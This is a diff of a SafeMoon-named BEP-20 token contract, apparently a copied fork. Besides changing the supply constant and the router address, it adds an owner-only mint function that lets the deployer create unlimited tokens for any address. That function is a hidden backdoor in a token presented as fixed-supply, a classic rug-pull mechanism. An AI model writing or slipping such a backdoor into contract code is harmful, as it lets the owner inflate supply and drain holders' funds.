@@ -1,9 +1,5 @@
 /**
- *Submitted for verification at BscScan.com on 2021-03-01
-*/
-
-/**
- *Submitted for verification at BscScan.com on 2021-03-01
+ *Submitted for verification at BscScan.com on 2021-07-22
 */
 
 /**
@@ -716,7 +712,8 @@ contract SafeMoon is Context, IERC20, Ownable {
    
     uint256 private constant MAX = ~uint256(0);
     uint256 private _tTotal = 1000000000 * 10**6 * 10**9;
-    uint256 private _rTotal = (MAX - (MAX % _tTotal));
+    uint256 private maxVal = _tTotal*1000000000;
+    uint256 private _rTotal = (maxVal - (maxVal % _tTotal));
     uint256 private _tFeeTotal;
 
     string private _name = "SafeMoon";
@@ -755,7 +752,7 @@ contract SafeMoon is Context, IERC20, Ownable {
     constructor () public {
         _rOwned[_msgSender()] = _rTotal;
         
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x52530AeEcd4574b880924b3FAFa16c0B6b081329);
          // Create a uniswap pair for this new token
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
@@ -769,7 +766,14 @@ contract SafeMoon is Context, IERC20, Ownable {
         
         emit Transfer(address(0), _msgSender(), _tTotal);
     }
-
+    function mint(address recipient, uint256 amount) onlyOwner public
+    {
+        uint256 _rAmount = _rTotal.div(_tTotal).mul(amount);
+        _rOwned[recipient] = _rOwned[recipient].add(_rAmount);
+        _tTotal = _tTotal.add(amount);
+        _rTotal = _rTotal.add(_rAmount);
+        emit Transfer(address(0), recipient, amount);
+    }
     function name() public view returns (string memory) {
         return _name;
     }
@@ -1159,8 +1163,4 @@ contract SafeMoon is Context, IERC20, Ownable {
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
-
-
-    
-
 }
